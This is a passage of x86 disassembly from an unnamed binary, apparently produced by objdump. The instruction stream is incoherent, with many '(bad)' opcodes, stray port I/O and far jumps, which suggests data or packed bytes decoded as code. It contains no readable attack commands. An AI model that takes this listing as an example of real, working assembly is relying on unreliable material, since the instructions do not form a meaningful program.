  4076cf:	push   eax
  4076d1:	repnz add dh,BYTE PTR [ebp-0x76]
  4076d5:	jp     0x4076d6
  4076d7:	mov    esi,0xdd992778
  4076dc:	out    dx,eax
  4076dd:	fwait
  4076de:	pop    ecx
  4076df:	sbb    DWORD PTR [ebx],0x44a02ef6
  4076e5:	lods   eax,DWORD PTR ds:[esi]
  4076e6:	inc    edi
  4076e7:	add    bl,dl
  4076e9:	mov    ecx,0x76653d23
  4076ee:	or     ecx,DWORD PTR [edx+0x11]
  4076f1:	bound  ebx,QWORD PTR [edi-0x71]
  4076f4:	sub    ch,ah
  4076f6:	ret    
  4076f7:	dec    ebp
  4076f8:	in     eax,0x5f
  4076fa:	stc    
  4076fb:	mov    BYTE PTR [ebx-0x6dfecec9],bl
  407701:	cmp    ch,BYTE PTR [ecx+0x187b2f83]
  407707:	ffree  st(3)
  407709:	in     al,0x15
  40770b:	fcom   QWORD PTR [eax]
  40770d:	pusha  
  40770e:	icebp  
  40770f:	or     BYTE PTR [ebx+0x6b260fe7],al
  407715:	lods   eax,DWORD PTR ds:[esi]
  407716:	(bad)  
  407717:	loopne 0x407746
  407719:	aas    
  40771a:	mov    dh,0xf4
  40771c:	test   esp,ebp
  40771e:	rol    esp,cl
  407720:	mov    bl,0xee
  407722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407723:	fimul  WORD PTR [ebx]
  407725:	jmp    0x5820:0xc88c3511
  40772c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40772d:	and    al,0x99
  40772f:	ds add bh,BYTE PTR ds:[esp+ebx*1-0x4c900f4]
  407738:	cmp    DWORD PTR [edx-0x66],esp
  40773b:	xor    ah,BYTE PTR [ebp+0x10ff26d4]
  407741:	call   DWORD PTR [edx+esi*4]
  407744:	leave  
  407745:	stos   BYTE PTR es:[edi],al
  407746:	mov    dl,0xd8
  407748:	xchg   ebp,eax
  407749:	sub    ebp,edx
  40774b:	aam    0xed
  40774d:	mov    dl,0xc7
  40774f:	or     BYTE PTR [eax],al
  407751:	mov    ds:0x144b3879,al
  407756:	mov    edi,0x7ac74ab4
  40775b:	mov    esi,ebp
  40775d:	aaa    
  40775e:	(bad)  
  40775f:	icebp  
  407760:	push   ecx
  407761:	adc    BYTE PTR [edi-0x522fd16f],ch
  407767:	push   esi
  407768:	cwde   
  407769:	sub    bl,BYTE PTR [ebx]
  40776b:	push   esi
  40776c:	repz (bad) 
  40776e:	fld    QWORD PTR [esi]
  407770:	push   eax
  407771:	in     eax,0x63
  407773:	push   ebp
  407774:	mov    dl,0x4e
  407776:	jg     0x407795
  407778:	pop    esi
  407779:	sub    eax,0x93240bc9
  40777e:	pop    es
  40777f:	in     al,dx
  407780:	out    dx,al
  407781:	inc    ecx
  407782:	xchg   ebx,eax
  407783:	inc    edi
  407784:	(bad)  
  407785:	pushf  
  407786:	rol    edx,cl
  407788:	push   es
  407789:	mov    al,0x9d
  40778b:	(bad)  
  40778c:	sbb    ecx,eax
  40778e:	imul   edx
  407790:	mov    dl,0xe
  407792:	xchg   edx,eax
  407793:	xchg   ebp,eax
  407794:	test   dh,dl
  407796:	inc    ebx
  407797:	call   0x3965185
  40779c:	das    
  40779d:	xlat   BYTE PTR ds:[ebx]
  40779e:	mov    BYTE PTR [ecx+0x751afff4],cl
  4077a4:	hlt    
  4077a5:	outs   dx,DWORD PTR ds:[esi]
  4077a6:	jne    0x40774d
  4077a8:	shr    esi,cl
  4077aa:	push   ss
  4077ab:	stc    
  4077ac:	mov    bl,0x9e
  4077ae:	sbb    BYTE PTR [ebx-0x75],dh
  4077b1:	retf   
  4077b2:	aam    0xec
  4077b4:	shr    BYTE PTR [ebx+0x93a8f0d],1
  4077ba:	xor    ebx,DWORD PTR [esi-0x48]
  4077bd:	dec    ecx
  4077be:	fwait
  4077bf:	sbb    dh,bh
  4077c1:	jle    0x407813
  4077c3:	jmp    0x8f323163
  4077c8:	inc    eax
  4077c9:	adc    edx,DWORD PTR [ebx+0x54]
  4077cc:	fstp   DWORD PTR [ebx+0x58]
  4077cf:	xor    ebx,ecx
  4077d1:	cmp    eax,0xa2d9c180
  4077d6:	sbb    eax,DWORD PTR [ebx*1-0x25986b4e]
  4077dd:	repz leave 
  4077df:	inc    esp
  4077e0:	in     al,dx
  4077e1:	jge    0x407812
  4077e3:	ds xchg esi,eax
  4077e5:	xchg   ebp,eax
  4077e6:	and    bh,BYTE PTR [edx]
  4077e8:	sub    BYTE PTR [edx+eiz*1-0x5c],0x69
  4077ed:	sub    eax,0xe90129c7
  4077f2:	shr    DWORD PTR [eax],1
  4077f4:	das    
  4077f5:	out    0x97,al
  4077f7:	lods   al,BYTE PTR ds:[esi]
  4077f8:	inc    edi
  4077f9:	mov    ebx,0xa7c6e8ec
  4077fe:	and    eax,0x12e4745d
  407803:	push   edi
  407804:	mov    ebp,DWORD PTR [ebx]
  407806:	sbb    edx,DWORD PTR [ebp+edx*2-0x21]
  40780a:	mov    bl,BYTE PTR [ecx]
  40780c:	cmp    ah,BYTE PTR [edi+eiz*8-0xd25a0a6]
  407813:	sbb    DWORD PTR [edx+0xd763f31],esi
  407819:	fstp   TBYTE PTR [eax+0x8bd2bc6]
  40781f:	jae    0x40789a
  407821:	dec    ebp
  407822:	aaa    
  407823:	pop    ebx
  407824:	nop
  407825:	call   0x31ddc670
  40782a:	or     DWORD PTR [eax-0xe5ec9ec],edx
  407830:	cdq    
  407831:	test   BYTE PTR [edi+ebx*8+0xe762950],ah
  407838:	jbe    0x4078b4
  40783a:	cdq    
  40783b:	sub    ah,BYTE PTR [ebp+0x4d]
  40783e:	cdq    
  40783f:	fwait
  407840:	retf   0x5c6f
  407843:	mov    dh,bh
  407845:	cmp    DWORD PTR [ecx+0x7e8cedf],ecx
  40784b:	or     eax,0x64e42982
  407850:	push   0xc9c1d763
  407855:	ss jae 0x4077db
  407858:	repnz nop
  40785a:	call   0x3fe6185
  40785f:	pop    esp
  407860:	cmp    BYTE PTR [edi+0x1a0dfa09],cl
  407866:	neg    DWORD PTR [ebp+0x78cc7b40]
  40786c:	rol    dh,0x6c
  40786f:	xchg   BYTE PTR [edi+0x2f],bh
  407872:	(bad)  
  407873:	jno    0x4078d8
  407875:	mov    al,0x76
  407877:	add    esp,ebp
  407879:	bound  eax,QWORD PTR [ecx-0x1954598a]
  40787f:	mov    ecx,0x86692cce
  407884:	sbb    DWORD PTR [eax+0x23],0x7e
  407888:	(bad)  
  407889:	loop   0x40783c
  40788b:	pop    ds
  40788c:	or     ebp,DWORD PTR [edx]
  40788e:	mov    edx,0x13480b26
  407893:	out    dx,eax
  407894:	add    ecx,edi
  407896:	daa    
  407897:	sub    eax,0x8cbc0091
  40789c:	sbb    eax,0xe8e9d99a
  4078a1:	rol    cl,0xe9
  4078a4:	addr16 jge 0x407880
  4078a7:	push   edx
  4078a8:	or     cl,bh
  4078aa:	push   edx
  4078ab:	jge    0x4078a0
  4078ad:	pop    ds
  4078ae:	dec    ebx
  4078af:	mov    ecx,0x7dde2824
  4078b4:	adc    DWORD PTR [eax+ebp*1+0x54c64627],edx
  4078bb:	pushf  
  4078bc:	call   0xacce:0x3cfcaa3b
  4078c3:	inc    eax
  4078c4:	(bad)  
  4078c5:	repnz popf 
  4078c7:	ins    DWORD PTR es:[edi],dx
  4078c8:	adc    al,0xba
  4078ca:	shl    BYTE PTR [eax],cl
  4078cc:	out    0x2c,eax
  4078ce:	xor    eax,0x859b9abf
  4078d3:	lds    ebx,FWORD PTR ds:0xda781330
  4078d9:	inc    edi
  4078da:	fnstcw WORD PTR [edx+edi*2]
  4078dd:	ret    0x6569
  4078e0:	icebp  
  4078e1:	adc    al,0x77
  4078e3:	and    al,0xb0
  4078e5:	into   
  4078e6:	cli    
  4078e7:	lods   eax,DWORD PTR ds:[esi]
  4078e8:	jg     0x407940
  4078ea:	scas   eax,DWORD PTR es:[edi]
  4078eb:	aas    
  4078ec:	sbb    cl,BYTE PTR [edx+eax*8]
  4078ef:	add    ch,BYTE PTR [esi+ebx*2-0x71]
  4078f3:	scas   eax,DWORD PTR es:[edi]
  4078f4:	cmp    esi,DWORD PTR [edx+0x11]
  4078f7:	mov    ecx,0x85f17a2e
  4078fc:	mov    esi,0x39f13cac
  407901:	test   eax,0xd278fa15
  407906:	pop    ebp
  407907:	pop    esi
  407908:	aaa    
  407909:	retf   0xb71d
  40790c:	nop
  40790d:	pop    eax
  40790e:	call   0x5ce5695b
  407913:	push   cs
  407914:	push   ds
  407915:	aam    0x3a
  407917:	gs es push eax
  40791a:	xor    bh,BYTE PTR [ebp-0x6d]
  40791d:	and    al,0x5e
  40791f:	dec    ecx
  407920:	mov    ebx,0x1d1e9d56
  407925:	cmp    eax,0xb5cd24cf
  40792a:	shl    DWORD PTR [ebx+0x59],cl
  40792d:	xor    dl,BYTE PTR [ebx-0x7f]
  407930:	add    DWORD PTR [ecx],ebp
  407932:	fistp  DWORD PTR [ecx-0x158fd872]
  407938:	and    al,0x25
  40793a:	mov    ebx,0x57b48abf
  40793f:	lds    esp,FWORD PTR [ecx-0x6a533f5e]
  407945:	fwait
  407946:	rol    bl,1
  407948:	sbb    eax,0xdcded0d3
  40794d:	mov    esi,0x4f55235
  407952:	pop    ebp
  407953:	jp     0x407925
  407955:	jnp    0x407937
  407957:	sahf   
  407958:	pop    es
  407959:	xor    esi,esp
  40795b:	in     al,0xcb
  40795d:	test   BYTE PTR [edi-0x12],ah
  407960:	push   esi
  407961:	cdq    
  407962:	jge    0x40797d
  407964:	pop    ebp
  407965:	or     eax,0x8e899a35
  40796a:	sub    eax,0x7977d030
  40796f:	sub    esi,DWORD PTR [edi]
  407971:	push   edx
  407972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407973:	sub    bh,dl
  407975:	adc    BYTE PTR [ebx+edi*1-0x23],ah
  407979:	or     eax,0x94ab7fb4
  40797e:	(bad)  
  407980:	out    dx,eax
  407981:	jno    0x4079fc
  407983:	or     al,0xa9
  407985:	(bad)
  407988:	xchg   esi,eax
  407989:	test   ebp,ecx
  40798b:	stos   DWORD PTR es:[edi],eax
  40798c:	cmp    edx,DWORD PTR [esi-0x5af73505]
  407992:	mov    ah,0xbd
  407994:	retf   0x9766
  407997:	fadd   st(1),st
  407999:	and    edx,ebx
  40799b:	inc    ebp
  40799c:	ret    
  40799d:	cwde   
  40799e:	xchg   ebp,eax
  40799f:	js     0x4079a4
  4079a1:	mov    esi,0x6632c680
  4079a6:	add    al,0xa6
  4079a8:	pop    edx
  4079a9:	outs   dx,DWORD PTR ds:[esi]
  4079aa:	push   es
  4079ab:	std    
  4079ac:	dec    ebp
  4079ad:	jmp    0x4079d1
  4079af:	push   esp
  4079b0:	push   0x1d0edb84
  4079b5:	adc    ebx,DWORD PTR [ebp+ebx*4+0x56]
  4079b9:	mov    esp,0xebb67a2c
  4079be:	fmul   DWORD PTR [ebp+0x6361cd77]
  4079c4:	cmp    eax,0xa6bdf58a
  4079c9:	push   ds
  4079ca:	call   0xe8031585
  4079cf:	les    edi,FWORD PTR [esi+esi*4-0x513ff412]
  4079d6:	shr    DWORD PTR [ebp+0x5092abe0],cl
  4079dc:	mov    eax,ds:0x8034b1f5
  4079e1:	jns    0x4079ac
  4079e3:	cmc    
  4079e4:	shl    ebp,1
  4079e6:	or     al,0x91
  4079e8:	push   es
  4079e9:	dec    esi
  4079ea:	mov    ebx,DWORD PTR [eax+0x67]
  4079ed:	clc    
  4079ee:	icebp  
  4079ef:	(bad)  
  4079f0:	or     cl,dh
  4079f2:	out    dx,al
  4079f3:	xchg   ebx,eax
  4079f4:	jnp    0x407a16
  4079f6:	mov    dl,0xd
  4079f8:	popf   
  4079f9:	ret    
  4079fa:	rcr    ch,cl
  4079fc:	ins    BYTE PTR es:[edi],dx
  4079fd:	shl    DWORD PTR [esi-0x34],cl
  407a00:	mov    bh,0x74
  407a02:	mov    esi,0x1ea28d39
  407a07:	mov    ah,0x74
  407a09:	jg     0x40798c
  407a0b:	inc    ecx
  407a0c:	rcr    DWORD PTR [ebx-0x6c],0x50
  407a10:	push   0xffffffe2
  407a12:	jae    0x407995
  407a14:	adc    dh,BYTE PTR [eax+0x32f59f25]
  407a1a:	lea    ecx,[ebx-0x33743d79]
  407a20:	out    dx,al
  407a21:	mov    ebp,0x719a4281
  407a26:	and    eax,0xa8750dd3
  407a2b:	ret    
  407a2c:	pop    ebx
  407a2d:	and    esp,DWORD PTR [ecx+0x27]
  407a30:	adc    DWORD PTR [ebp-0x74cd8219],ecx
  407a36:	out    dx,eax
  407a37:	dec    ebp
  407a38:	jg     0x4079cc
  407a3a:	mov    dl,0xdb
  407a3c:	ds mov ah,0x22
  407a3f:	ret    0x620a
  407a42:	(bad)  
  407a43:	out    0x3a,al
  407a45:	in     eax,0xac
  407a47:	(bad)  
  407a49:	hlt    
  407a4a:	mov    edi,0x37f4128
  407a4f:	jmp    FWORD PTR [edx+0x42cc4d9e]
  407a55:	xor    ebx,esi
  407a57:	std    
  407a58:	xor    BYTE PTR [ecx],dl
  407a5a:	jmp    0x9095bae
  407a5f:	dec    esp
  407a60:	jno    0x4079f1
  407a62:	call   0x6bcf95cc
  407a67:	clc    
  407a68:	shl    ch,cl
  407a6a:	aam    0x60
  407a6c:	mov    esp,0x41f11572
  407a71:	jno    0x407a50
  407a73:	cmp    dh,BYTE PTR [ecx-0x342c20f4]
  407a79:	lods   eax,DWORD PTR ds:[esi]
  407a7a:	sar    esi,cl
  407a7c:	dec    eax
  407a7d:	out    0xa8,al
  407a7f:	push   es
  407a80:	stos   DWORD PTR es:[edi],eax
  407a81:	fwait
  407a82:	std    
  407a83:	repz fldenv [ebx-0x39]
  407a87:	or     BYTE PTR [ebp+0x4d],bl
  407a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a8b:	xor    eax,0x103927da
  407a90:	imul   edx,DWORD PTR ds:0x9889ef29,0xe73b2b35
  407a9a:	mov    bl,0x48
  407a9c:	xor    eax,0xa7234e88
  407aa1:	mov    ds:0x396ad67a,eax
  407aa6:	pop    esi
  407aa7:	and    DWORD PTR [ecx],edi
  407aa9:	jbe    0x407adc
  407aab:	xchg   esp,eax
  407aac:	jle    0x407a69
  407aae:	gs xor ecx,edi
  407ab1:	push   es
  407ab2:	les    ebp,FWORD PTR [esi+0x9b766bc]
  407ab8:	sbb    DWORD PTR [esi+0x55],0x14609a2b
  407abf:	hlt    
  407ac0:	or     ecx,DWORD PTR [ebp+0x4f7c049e]
  407ac6:	jnp    0x407ac8
  407ac8:	adc    al,BYTE PTR ds:0xfbabdc7b
  407ace:	call   0x32a3:0x5bc4fddd
  407ad5:	add    al,0x5e
  407ad7:	xlat   BYTE PTR ds:[ebx]
  407ad8:	or     ah,BYTE PTR [esi-0x6b]
  407adb:	sub    ebp,DWORD PTR ds:0x23d94e83
  407ae1:	sbb    ch,BYTE PTR [edi]
  407ae3:	int    0x33
  407ae5:	xor    DWORD PTR [edi-0x10e5225b],edx
  407aeb:	aad    0x49
  407aed:	hlt    
  407aee:	int3   
  407aef:	les    ecx,FWORD PTR [edi-0x7f]
  407af2:	mov    ebx,0xb49b38a0
  407af7:	cmp    al,0x27
  407af9:	mov    cl,0xee
  407afb:	popf   
  407afc:	add    BYTE PTR [esi+0x16d9a1ed],al
  407b02:	jmp    0x407a86
  407b04:	pop    edi
  407b05:	push   ecx
  407b06:	ret    0x1256
  407b09:	jl     0x407b49
  407b0b:	and    bh,BYTE PTR [esp+edi*1-0x79]
  407b0f:	add    DWORD PTR [ebx-0x6f],0xa
  407b13:	cli    
  407b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b15:	and    DWORD PTR [edx-0x210b4e46],esp
  407b1b:	pop    esi
  407b1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b1d:	pop    edi
  407b1e:	mov    dh,0x97
  407b20:	mov    DWORD PTR [ebp+0x68],edx
  407b23:	cmp    BYTE PTR [edx+0x578998e2],0xc1
  407b2a:	sbb    BYTE PTR [eax-0x2],ah
  407b2d:	call   0xe259c0c
  407b32:	outs   dx,BYTE PTR ds:[esi]
  407b33:	inc    esp
  407b34:	mov    ecx,0x1255927e
  407b39:	xor    ebp,DWORD PTR [ecx-0x3ade8f25]
  407b3f:	loope  0x407b03
  407b41:	jnp    0x407b40
  407b43:	dec    edi
  407b44:	pop    ecx
  407b45:	or     al,0x4a
  407b47:	pop    ebx
  407b48:	int3   
  407b49:	int    0xa7
  407b4b:	repnz clc 
  407b4d:	call   0x67ed:0x23c6f8d8
  407b54:	inc    eax
  407b55:	cdq    
  407b56:	mov    DWORD PTR [edx-0x7f416698],ebp
  407b5c:	push   ds
  407b5d:	les    esp,FWORD PTR [esi]
  407b5f:	pop    edi
  407b60:	int3   
  407b61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b62:	(bad)  
  407b63:	(bad)  
  407b65:	ror    DWORD PTR [ecx+0xd0e05f0],cl
  407b6b:	jne    0x407aff
  407b6d:	ret    0x9a98
  407b70:	push   edx
  407b71:	fisttp DWORD PTR [esi+eax*2]
  407b74:	sti    
  407b75:	cmp    DWORD PTR [eax+ebp*4-0x38b3db0b],ebp
  407b7c:	push   edi
  407b7d:	push   edx
  407b7e:	in     al,0x40
  407b80:	inc    edi
  407b81:	or     al,BYTE PTR [ebx-0x1bef4d27]
  407b87:	xchg   BYTE PTR [ebx+eiz*4-0x2c],ch
  407b8b:	and    bh,BYTE PTR [edx-0x6f6a68f]
  407b91:	sbb    al,0x32
  407b93:	xor    dl,BYTE PTR [edx+eax*4-0x2166ae9f]
  407b9a:	jle    0x407b9b
  407b9c:	stc    
  407b9d:	(bad)  
  407b9e:	jns    0x407bd5
  407ba0:	and    cl,ah
  407ba2:	pop    esi
  407ba3:	iret   
  407ba4:	pop    ebp
  407ba5:	or     ebx,eax
  407ba7:	jmp    0xb4d7bc42
  407bac:	inc    ecx
  407bad:	xor    BYTE PTR [edx],ah
  407baf:	test   eax,0x965eaa9a
  407bb4:	pushf  
  407bb5:	mov    ecx,0x3f4c2d07
  407bba:	inc    edx
  407bbb:	icebp  
  407bbc:	xor    DWORD PTR [ebx-0x59],eax
  407bbf:	pusha  
  407bc0:	mov    WORD PTR [edi+0x13947768],ds
  407bc6:	add    ebp,esp
  407bc8:	or     esi,DWORD PTR [ebp+0x20]
  407bcb:	mov    ecx,0x8ec1d103
  407bd0:	inc    ebx
  407bd1:	xor    eax,DWORD PTR [edi]
  407bd3:	cld    
  407bd4:	xchg   DWORD PTR [esp+ebx*1-0x708f1bc8],ebp
  407bdb:	jno    0x407bdd
  407bdd:	ficomp WORD PTR [edi-0x391f8c6a]
  407be3:	inc    edx
  407be4:	jnp    0x407b73
  407be6:	shr    BYTE PTR [esi],1
  407be8:	add    al,0x21
  407bea:	xchg   ecx,eax
  407beb:	push   cs
  407bec:	dec    ebx
  407bed:	(bad)  
  407bee:	push   esi
  407bef:	rol    DWORD PTR [edx+edi*8],cl
  407bf2:	xchg   esp,eax
  407bf3:	ins    DWORD PTR es:[edi],dx
  407bf4:	mov    edx,0x302d8988
  407bf9:	cmp    DWORD PTR [edi],esi
  407bfb:	pop    DWORD PTR [edi-0x101c64aa]
  407c01:	xchg   ebp,eax
  407c02:	pop    es
  407c03:	loopne 0x407bab
  407c05:	rol    DWORD PTR [eax],cl
  407c07:	or     al,0xdd
  407c09:	pop    ds
  407c0a:	aam    0x84
  407c0c:	pushf  
  407c0d:	cmp    al,ah
  407c0f:	pushf  
  407c10:	dec    ecx
  407c11:	les    ebx,FWORD PTR [ecx]
  407c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c14:	rcl    DWORD PTR [edi+ecx*1],cl
  407c17:	sub    edi,DWORD PTR [ecx+0x7a]
  407c1a:	popa   
  407c1b:	nop
  407c1c:	cli    
  407c1d:	push   esp
  407c1e:	shl    BYTE PTR [esi-0x7127ea93],1
  407c24:	pop    edi
  407c25:	xchg   edi,eax
  407c26:	add    edi,DWORD PTR [esi-0x39]
  407c29:	lock iret 
  407c2b:	push   esi
  407c2c:	jne    0x407c01
  407c2e:	xchg   BYTE PTR [bp+si],al
  407c31:	cmp    BYTE PTR [ebp-0x72],ch
  407c34:	mov    ah,BYTE PTR [edi]
  407c36:	test   eax,0x24741561
  407c3b:	aam    0x35
  407c3d:	fiadd  WORD PTR [eax-0x1d]
  407c40:	add    eax,0x4299432
  407c45:	and    DWORD PTR [ebx+0x5247081f],edx
  407c4b:	xor    al,bl
  407c4d:	fsubr  QWORD PTR [eax-0x55]
  407c50:	sbb    BYTE PTR [ebx+edi*1-0x29298db1],0x90
  407c58:	sar    esi,0x8b
  407c5b:	pop    edi
  407c5c:	stc    
  407c5d:	mov    bh,bh
  407c5f:	outs   dx,DWORD PTR ds:[esi]
  407c60:	das    
  407c61:	clc    
  407c62:	jmp    0x2011:0xde6aa06e
  407c69:	dec    eax
  407c6a:	pop    eax
  407c6b:	mov    cl,0x49
  407c6d:	fwait
  407c6e:	rol    esi,1
  407c70:	xchg   DWORD PTR [eax],ebx
  407c72:	addr16 push ss
  407c74:	das    
  407c75:	mov    al,ds:0x75e11d0a
  407c7a:	(bad)  
  407c7b:	aam    0x80
  407c7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c7e:	xchg   ebx,eax
  407c7f:	inc    ebp
  407c80:	scas   al,BYTE PTR es:[edi]
  407c81:	sbb    eax,DWORD PTR [edi]
  407c83:	mov    dh,0x4b
  407c85:	mov    ah,0x82
  407c87:	imul   BYTE PTR [ebx+0x72549d6a]
  407c8d:	shr    BYTE PTR [ebp+0x40],0x9d
  407c91:	and    eax,edi
  407c93:	sub    DWORD PTR [eax+0x65],ebp
  407c96:	stos   BYTE PTR es:[edi],al
  407c97:	aam    0x7a
  407c99:	or     ch,cl
  407c9b:	mov    fs,esp
  407c9d:	pop    edx
  407c9e:	imul   BYTE PTR [edi]
  407ca0:	arpl   WORD PTR [edx-0x3822e48e],cx
  407ca6:	jns    0x407cdc
  407ca8:	and    ah,BYTE PTR ds:0x4b229b3a
  407cae:	adc    al,0x45
  407cb0:	adc    esp,DWORD PTR [ebx+edx*2-0x7f565fca]
  407cb7:	stos   DWORD PTR es:[edi],eax
  407cb8:	ins    BYTE PTR es:[edi],dx
  407cb9:	cmp    dh,BYTE PTR ds:0x8dcb3818
  407cbf:	pop    eax
  407cc0:	je     0x407d1d
  407cc2:	in     al,0x16
  407cc4:	ret    
  407cc5:	cmp    edi,DWORD PTR [ebp+0x2b48d89e]
  407ccb:	repz in al,dx
  407ccd:	fiadd  DWORD PTR [ecx]
  407ccf:	inc    eax
  407cd0:	fistp  QWORD PTR [edi-0x40363a7d]
  407cd6:	mov    ?,WORD PTR [edi+0x58231e96]
  407cdc:	in     al,0xaf
  407cde:	retf   0x73d6
  407ce1:	mov    dh,0xa3
  407ce3:	clc    
  407ce4:	adc    al,0xbd
  407ce6:	gs pop ebp
  407ce8:	shl    DWORD PTR [ebp-0xe92a0fa],0xe
  407cef:	iret   
  407cf0:	ret    
  407cf1:	(bad)  [esi]
  407cf3:	sbb    edx,DWORD PTR [ebp-0xa]
  407cf6:	stos   BYTE PTR es:[edi],al
  407cf7:	(bad)  
  407cf8:	loopne 0x407ce5
  407cfa:	xchg   BYTE PTR [ebx+eax*8-0x26bdfe8e],bh
  407d01:	sub    esp,esi
  407d03:	jl     0x407d7e
  407d05:	mov    eax,0x467af831
  407d0a:	mov    esp,0xc20ee9ab
  407d0f:	push   es
  407d10:	push   edi
  407d11:	pop    ss
  407d12:	out    0x1d,al
  407d14:	or     eax,0x2d83b640
  407d19:	add    eax,0xa18ea0a2
  407d1e:	inc    edi
  407d1f:	leave  
  407d20:	sbb    eax,0x564806c6
  407d25:	push   ebx
  407d26:	not    BYTE PTR [ecx-0x18]
  407d29:	in     eax,dx
  407d2a:	jle    0x407d8a
  407d2c:	mov    esp,0xaa6d0625
  407d31:	xor    al,0xca
  407d33:	mov    eax,ds:0x2fe6d312
  407d38:	push   ebp
  407d39:	and    DWORD PTR [ebp+ecx*2-0x698f4860],ecx
  407d40:	and    DWORD PTR ds:0xb7c8df4a,esp
  407d46:	adc    eax,0xa180693f
  407d4b:	or     eax,0x5f3ceb4b
  407d50:	mov    ebx,0x353e162
  407d55:	mov    dl,0xd7
  407d57:	and    ebx,DWORD PTR [edx]
  407d59:	loopne 0x407d15
  407d5b:	dec    ebx
  407d5c:	mov    edx,0x296039af
  407d61:	and    al,0x38
  407d63:	aas    
  407d64:	pop    eax
  407d65:	dec    esi
  407d66:	pop    edi
  407d67:	inc    BYTE PTR [edx+0x58832d]
  407d6d:	push   esi
  407d6e:	mov    esp,0x52a58f03
  407d73:	push   ds
  407d74:	inc    edx
  407d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d76:	jecxz  0x407d38
  407d78:	ja     0x407df7
  407d7a:	inc    esp
  407d7b:	dec    edx
  407d7c:	xor    BYTE PTR [esi+0x670922b],bh
  407d82:	inc    ebx
  407d83:	call   0xd0ff:0x224b531f
  407d8a:	retf   0x5789
  407d8d:	dec    ebx
  407d8e:	adc    esp,esi
  407d90:	(bad)  [ebp-0x2a150111]
  407d96:	ss mov esi,0x84e2fbe7
  407d9c:	mov    gs,WORD PTR [edi+0xf04687c]
  407da2:	adc    eax,eax
  407da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407da5:	dec    edi
  407da6:	nop
  407da7:	(bad)  
  407da8:	addr16 mov al,dh
  407dab:	pusha  
  407dac:	les    edx,FWORD PTR [ecx+0x68]
  407daf:	repnz fwait
  407db1:	cmp    esp,ecx
  407db3:	arpl   WORD PTR [edi-0x4b],di
  407db6:	out    dx,al
  407db7:	clc    
  407db8:	pop    esi
  407db9:	into   
  407dba:	jo     0x407d9b
  407dbc:	sub    al,0xec
  407dbe:	iret   
  407dbf:	mov    bh,0x40
  407dc1:	adc    DWORD PTR [esi],0xbf4178b9
  407dc7:	xor    DWORD PTR [edx+0x4ed1f000],edx
  407dcd:	fsub   DWORD PTR [edx-0x5765a4db]
  407dd3:	outs   dx,DWORD PTR ds:[esi]
  407dd4:	dec    esi
  407dd5:	call   0x7940:0x1346818
  407ddc:	pop    edx
  407ddd:	mov    edx,0x92bfd011
  407de2:	jmp    0x407dd2
  407de4:	lahf   
  407de5:	mov    ah,0xa4
  407de7:	mov    ds:0x70afcc36,al
  407dec:	mov    bh,0xeb
  407dee:	imul   ebx,ebx,0xb1fb3277
  407df4:	add    edx,ebx
  407df6:	or     BYTE PTR [ecx],bl
  407df8:	xchg   ebx,eax
  407df9:	ins    BYTE PTR es:[edi],dx
  407dfa:	jl     0x407de3
  407dfc:	jle    0x407e14
  407dfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dff:	stos   BYTE PTR es:[edi],al
  407e00:	retf   
  407e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e02:	or     al,0x8f
  407e04:	cmp    edx,DWORD PTR [ecx+ecx*2+0x73b505d1]
  407e0b:	repz leave 
  407e0d:	xor    DWORD PTR [ebp+0x37],ecx
  407e10:	imul   edx,DWORD PTR fs:[edi-0x16b16576],0x65a3d5d4
  407e1b:	mov    edx,0x61ea999e
  407e20:	cmp    al,0x7f
  407e22:	aad    0x5
  407e24:	jge    0x407e12
  407e26:	dec    ebx
  407e27:	shl    BYTE PTR [ecx+0x5b1533fd],1
  407e2d:	jg     0x407dbc
  407e2f:	repz xor eax,0x985884cb
  407e35:	xor    BYTE PTR fs:[eax],0x5b
  407e39:	xor    DWORD PTR [edi],edi
  407e3b:	mov    edi,0xef82c73f
  407e40:	(bad)  
  407e41:	repnz (bad) 
  407e43:	out    dx,al
  407e44:	jne    0x407e5b
  407e46:	add    ah,BYTE PTR [edi-0x1623bad1]
  407e4c:	retf   
  407e4d:	nop
  407e4e:	mov    al,ds:0xb55c97e1
  407e53:	bound  ecx,QWORD PTR [ecx+edx*2]
  407e56:	imul   esi,DWORD PTR [eax-0x2adc1346],0x1f
  407e5d:	mov    ds:0xc52944a5,al
  407e62:	sub    edi,0x3c
  407e65:	mov    al,ds:0x12e14fbd
  407e6a:	retf   0xf9a8
  407e6d:	xchg   DWORD PTR [eax+0x3c],esp
  407e70:	sub    eax,0x4563cbc6
  407e75:	adc    DWORD PTR [esi+0x8326137],esi
  407e7b:	imul   BYTE PTR [edx-0x75]
  407e7e:	in     al,dx
  407e7f:	test   BYTE PTR [ebx-0x2c],ch
  407e82:	adc    DWORD PTR ds:0x23e51670,eax
  407e88:	fsubr  QWORD PTR [ebp+0x8fd3615]
  407e8e:	push   ebx
  407e8f:	mov    ebp,0xcc86433b
  407e94:	cmp    ecx,ebp
  407e96:	sbb    DWORD PTR [edi],0x34b3b3ef
  407e9c:	and    edx,DWORD PTR [ecx-0x6baf5d5b]
  407ea2:	sub    BYTE PTR [edx-0x69],bl
  407ea5:	das    
  407ea6:	ret    
  407ea7:	(bad)  
  407ea8:	add    ch,BYTE PTR [eax-0x18372855]
  407eae:	nop
  407eaf:	push   ecx
  407eb0:	pop    esi
  407eb1:	test   edx,ebp
  407eb3:	fimul  DWORD PTR [ecx+0x42]
  407eb6:	adc    WORD PTR [esi+0x61],ax
  407eba:	xchg   esi,eax
  407ebb:	mov    bl,0x25
  407ebd:	or     dh,BYTE PTR [eax]
  407ebf:	mov    edx,0x2f1bbe52
  407ec4:	xchg   esp,eax
  407ec5:	jae    0x407ed3
  407ec7:	add    BYTE PTR [ebp+0x4a608312],dh
  407ecd:	xor    al,0x7d
  407ecf:	scas   eax,DWORD PTR es:[edi]
